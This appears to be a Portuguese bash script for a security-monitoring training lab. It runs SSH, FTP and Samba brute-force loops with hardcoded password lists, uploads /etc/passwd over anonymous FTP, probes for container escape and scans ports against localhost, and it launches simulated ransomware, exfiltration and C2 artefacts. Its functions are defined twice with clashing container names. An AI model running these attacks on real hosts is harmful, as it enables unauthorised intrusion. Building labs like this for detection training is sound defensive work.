
#!/bin/bash

# Nome correto do container
CONTAINER_NAME="maq-3"

# Todas as funções devem ser declaradas antes do main
container_exists() {
    docker ps -a --format '{{.Names}}' | grep -w "$CONTAINER_NAME" | grep -v Exited >/dev/null
}
run_ransomware() {
    if container_exists; then
        docker exec -it $CONTAINER_NAME test -x /usr/local/bin/ransomware_simulado_linux.sh && {
            print_status "Disparando ransomware_simulado_linux.sh..."; docker exec -it $CONTAINER_NAME /usr/local/bin/ransomware_simulado_linux.sh;
        } || echo "[ERRO] Artefato ransomware_simulado_linux.sh não encontrado ou não executável no container."
    else
        echo "[ERRO] Container $CONTAINER_NAME não está rodando. Inicie o laboratório antes de executar os artefatos."
    fi
}
run_flood_logs() {
    if container_exists; then
        docker exec -it $CONTAINER_NAME test -x /usr/local/bin/flood_logs_linux.sh && {
            print_status "Disparando flood_logs_linux.sh..."; docker exec -it $CONTAINER_NAME /usr/local/bin/flood_logs_linux.sh;
        } || echo "[ERRO] Artefato flood_logs_linux.sh não encontrado ou não executável no container."
    else
        echo "[ERRO] Container $CONTAINER_NAME não está rodando. Inicie o laboratório antes de executar os artefatos."
    fi
}
run_exfiltracao() {
    if container_exists; then
        docker exec -it $CONTAINER_NAME test -x /usr/local/bin/exfiltracao_simulada.sh && {
            print_status "Disparando exfiltracao_simulada.sh..."; docker exec -it $CONTAINER_NAME /usr/local/bin/exfiltracao_simulada.sh;
        } || echo "[ERRO] Artefato exfiltracao_simulada.sh não encontrado ou não executável no container."
    else
        echo "[ERRO] Container $CONTAINER_NAME não está rodando. Inicie o laboratório antes de executar os artefatos."
    fi
}
run_portscan() {
    if container_exists; then
        docker exec -it $CONTAINER_NAME test -x /usr/local/bin/portscan_simulado.sh && {
            print_status "Disparando portscan_simulado.sh..."; docker exec -it $CONTAINER_NAME /usr/local/bin/portscan_simulado.sh;
        } || echo "[ERRO] Artefato portscan_simulado.sh não encontrado ou não executável no container."
    else
        echo "[ERRO] Container $CONTAINER_NAME não está rodando. Inicie o laboratório antes de executar os artefatos."
    fi
}
run_c2_agent() {
    if container_exists; then
        print_status "Executando agente de C2 (svcmon.py)..."
        docker exec -it $CONTAINER_NAME python3 /usr/local/bin/svcmon.py
    else
        echo "[ERRO] Container $CONTAINER_NAME não está rodando. Inicie o laboratório antes de executar o agente."
    fi
}
run_persistencia() {
    if container_exists; then
        docker exec -it $CONTAINER_NAME test -x /usr/local/bin/persistencia_simulada.sh && {
            print_status "Disparando persistencia_simulada.sh..."; docker exec -it $CONTAINER_NAME /usr/local/bin/persistencia_simulada.sh;
        } || echo "[ERRO] Artefato persistencia_simulada.sh não encontrado ou não executável no container."
    else
        echo "[ERRO] Container $CONTAINER_NAME não está rodando. Inicie o laboratório antes de executar os artefatos."
    fi
}

ataques_menu() {
    echo ""; echo "==== Ataques Automatizados ===="
    echo "1) Brute-force SSH"
    echo "2) Brute-force FTP"
    echo "3) Brute-force Samba"
    echo "4) Testar Escape de Container"
    echo "5) Testar Acesso a Arquivos Sensíveis"
    echo "0) Voltar"
    read -p "Escolha uma opção: " opt
    case $opt in
        1) test_ssh_attack ;;
        2) test_ftp_attack ;;
        3) test_samba_attack ;;
        4) test_container_escape ;;
        5) test_sensitive_files ;;
        0) artefatos_menu ;;
        *) echo "Opção inválida" ;;
    esac
}

artefatos_menu() {
    echo ""; echo "==== Disparar Artefatos Dinâmicos ===="
    echo "1) Ransomware Simulado"
    echo "2) Flood de Logs"
    echo "3) Exfiltração Simulada"
    echo "4) Portscan Simulado"
    echo "5) Persistência Simulada"
    echo "6) Ataques Automatizados"
    echo "7) Webshell PHP"
    echo "8) Executar agente de C2 (svcmon)"
    echo "0) Sair"
    read -p "Escolha uma opção: " opt
    case $opt in
        1) run_ransomware ;;
        2) run_flood_logs ;;
        3) run_exfiltracao ;;
        4) run_portscan ;;
        5) run_persistencia ;;
        6) ataques_menu ;;
        7) run_webshell ;;
        8) run_c2_agent ;;
        0) exit 0 ;;
        *) echo "Opção inválida" ;;
    esac
}

# Outras funções e variáveis do script (print_status, print_error, ataques, etc) devem vir abaixo

# =============================================================================
# Script de Teste de Ataque - MAQ-3
# Gera logs para captura pelo Elastic/Logstash
# =============================================================================

set -e

# Configurações
TARGET_HOST="localhost"
SSH_PORT="2222"
FTP_PORT="2121"
SMB_PORT="2445"

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_header() {
    echo -e "${BLUE}================================${NC}"
    echo -e "${BLUE}  TESTE DE ATAQUE - MAQ-3${NC}"
    echo -e "${BLUE}================================${NC}"
}

print_status() { echo -e "${GREEN}[INFO]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARN]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Função para testar SSH
test_ssh_attack() {
    print_status "Testando ataques SSH..."
    
    # Teste de brute force
    for user in root ftpuser smbuser admin user1; do
        for pass in password123 admin123 toor secret admin password; do
            timeout 5 sshpass -p "$pass" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -p $SSH_PORT "$user@$TARGET_HOST" "echo 'Login bem-sucedido'" 2>/dev/null && {
                print_status "✅ SSH comprometido: $user:$pass"
                break 2
            } || true
        done
    done
    
    # Teste de chave fraca
    print_status "Testando chaves SSH fracas..."
    ssh-keyscan -p $SSH_PORT $TARGET_HOST 2>/dev/null | grep -E "(1024|512)" && {
        print_status "✅ Chave SSH fraca detectada"
    }
}

# Função para testar FTP
test_ftp_attack() {
    print_status "Testando ataques FTP..."
    
    # Teste de acesso anônimo
    print_warning "Testando acesso FTP anônimo..."
    echo "ls" | timeout 10 ftp -n $TARGET_HOST $FTP_PORT 2>/dev/null && {
        print_status "✅ FTP anônimo acessível"
        
        # Tentar upload
        print_warning "Tentando upload via FTP anônimo..."
        echo -e "anonymous\nanonymous@test.com\nput /etc/passwd\nquit" | timeout 10 ftp -n $TARGET_HOST $FTP_PORT 2>/dev/null && {
            print_status "✅ Upload via FTP anônimo bem-sucedido"
        }
    }
    
    # Teste de brute force
    for user in ftpuser admin root; do
        for pass in password123 admin123 toor; do
            print_warning "Tentando FTP: $user:$pass"
            echo -e "$user\n$pass\nls\nquit" | timeout 10 ftp -n $TARGET_HOST $FTP_PORT 2>/dev/null && {
                print_status "✅ FTP comprometido: $user:$pass"
                break 2
            } || true
        done
    done
}

# Função para testar Samba
test_samba_attack() {
    print_status "Testando ataques Samba..."
    
    # Teste de acesso público
    print_warning "Testando acesso Samba público..."
    smbclient -L //$TARGET_HOST -U guest -p $SMB_PORT 2>/dev/null && {
        print_status "✅ Samba público acessível"
        
        # Tentar acessar compartilhamento
        print_warning "Tentando acessar compartilhamento público..."
        echo "ls" | smbclient //$TARGET_HOST/Public -U guest -p $SMB_PORT 2>/dev/null && {
            print_status "✅ Compartilhamento público acessível"
        }
    }
    
    # Teste de brute force
    for user in smbuser admin root; do
        for pass in password123 admin123 toor; do
            print_warning "Tentando Samba: $user:$pass"
            smbclient -L //$TARGET_HOST -U "$user%$pass" -p $SMB_PORT 2>/dev/null && {
                print_status "✅ Samba comprometido: $user:$pass"
                break 2
            } || true
        done
    done
}

# Função para testar escape de container
test_container_escape() {
    print_status "Testando escape de container..."
    
    # Verificar se Docker está acessível
    print_warning "Verificando acesso ao Docker socket..."
    if docker ps 2>/dev/null; then
        print_status "✅ Docker socket acessível"
        
        # Tentar listar containers
        print_warning "Listando containers..."
        docker ps -a 2>/dev/null && {
            print_status "✅ Escape de container possível via Docker"
        }
    fi
    
    # Verificar montagens sensíveis
    print_warning "Verificando montagens sensíveis..."
    if mount | grep -E "(proc|sys|docker)"; then
        print_status "✅ Montagens sensíveis detectadas"
    fi
    
    # Verificar capabilities
    print_warning "Verificando capabilities..."
    if capsh --print | grep -E "(SYS_ADMIN|NET_ADMIN|SYS_PTRACE)"; then
        print_status "✅ Capabilities perigosas detectadas"
    fi
}

# Função para testar acesso a arquivos sensíveis
test_sensitive_files() {
    print_status "Testando acesso a arquivos sensíveis..."
    
    # Testar acesso via FTP
    print_warning "Tentando baixar arquivos sensíveis via FTP..."
    if curl -s "ftp://$TARGET_HOST:$FTP_PORT/credentials.txt" 2>/dev/null; then
        print_status "✅ Arquivo de credenciais acessível via FTP"
    fi
    
    # Testar acesso via Samba
    print_warning "Tentando acessar arquivos sensíveis via Samba..."
    if smbclient //$TARGET_HOST/Public -U guest -p $SMB_PORT -c "get config.conf" 2>/dev/null; then
        print_status "✅ Arquivo de configuração acessível via Samba"
    fi
}

# Função para gerar tráfego de rede
generate_network_traffic() {
    print_status "Gerando tráfego de rede para captura..."
    
    # Ping flood
    print_warning "Executando ping flood..."
    ping -c 100 -i 0.1 $TARGET_HOST > /dev/null 2>&1 &
    
    # Port scanning
    print_warning "Executando port scan..."
    for port in 21 22 23 25 53 80 110 143 443 993 995 139 445 1433 1521 3306 3389 5432 5900 6379 8080 8443; do
        timeout 1 nc -z $TARGET_HOST $port 2>/dev/null && {
            print_status "Porta $port aberta"
        } || true
    done
    
    # HTTP requests (se houver web server)
    print_warning "Testando HTTP requests..."
    for i in {1..50}; do
        curl -s "http://$TARGET_HOST:$i" > /dev/null 2>&1 || true
        sleep 0.1
    done
}


# Detectar se está rodando no container
is_container() {
    grep -qE '/docker|/lxc' /proc/1/cgroup 2>/dev/null
}

CONTAINER_NAME="maquina3-soc"

run_ransomware() {
    print_status "Disparando ransomware_simulado_linux.sh..."
    if is_container; then
        /usr/local/bin/ransomware_simulado_linux.sh
    else
        docker exec -it $CONTAINER_NAME /usr/local/bin/ransomware_simulado_linux.sh
    fi
}
run_flood_logs() {
    print_status "Disparando flood_logs_linux.sh..."
    if is_container; then
        /usr/local/bin/flood_logs_linux.sh
    else
        docker exec -it $CONTAINER_NAME /usr/local/bin/flood_logs_linux.sh
    fi
}
run_exfiltracao() {
    print_status "Disparando exfiltracao_simulada.sh..."
    if is_container; then
        /usr/local/bin/exfiltracao_simulada.sh
    else
        docker exec -it $CONTAINER_NAME /usr/local/bin/exfiltracao_simulada.sh
    fi
}
run_portscan() {
    print_status "Disparando portscan_simulado.sh..."
    if is_container; then
        /usr/local/bin/portscan_simulado.sh
    else
        docker exec -it $CONTAINER_NAME /usr/local/bin/portscan_simulado.sh
    fi
}
run_persistencia() {
    print_status "Disparando persistencia_simulada.sh..."
    if is_container; then
        /usr/local/bin/persistencia_simulada.sh
    else
        docker exec -it $CONTAINER_NAME /usr/local/bin/persistencia_simulada.sh
    fi
}


## Removido menu duplicado artefatos_menu. Usar apenas a versão correta já definida acima.

# Função para mostrar resumo
show_summary() {
    print_status "Resumo do teste de ataque:"
    echo ""
    echo -e "${YELLOW}🎯 VULNERABILIDADES TESTADAS:${NC}"
    echo "• SSH brute force e chaves fracas"
    echo "• FTP anônimo e upload"
    echo "• Samba público e brute force"
    echo "• Escape de container via Docker"
    echo "• Acesso a arquivos sensíveis"
    echo "• Geração de tráfego de rede"
    echo ""
    echo -e "${YELLOW}📊 LOGS GERADOS:${NC}"
    echo "• Tentativas de login SSH"
    echo "• Acessos FTP anônimos"
    echo "• Conexões Samba"
    echo "• Comandos executados"
    echo "• Tráfego de rede"
    echo ""
    echo -e "${YELLOW}🔍 PRÓXIMOS PASSOS:${NC}"
    echo "• Verificar logs em ./logs/"
    echo "• Configurar Elastic/Logstash para captura"
    echo "• Analisar padrões de ataque"
    echo "• Configurar alertas"
}

# Função principal
main() {
    print_header
    
    # Verificar se o alvo está acessível
    print_status "Verificando conectividade com $TARGET_HOST..."
    if ! ping -c 1 $TARGET_HOST > /dev/null 2>&1; then
        print_error "Host $TARGET_HOST não está acessível"
        exit 1
    fi
    
    # Executar testes
    test_ssh_attack
    test_ftp_attack
    test_samba_attack
    test_container_escape
    test_sensitive_files
    generate_network_traffic
    
    # Aguardar um pouco para finalizar processos
    sleep 5
    
    # Mostrar resumo
    show_summary
    
    print_status "Teste de ataque concluído!"
}

# Executar função principal
if [[ "$1" == "artefatos" ]]; then
    artefatos_menu
    exit 0
else
    artefatos_menu
fi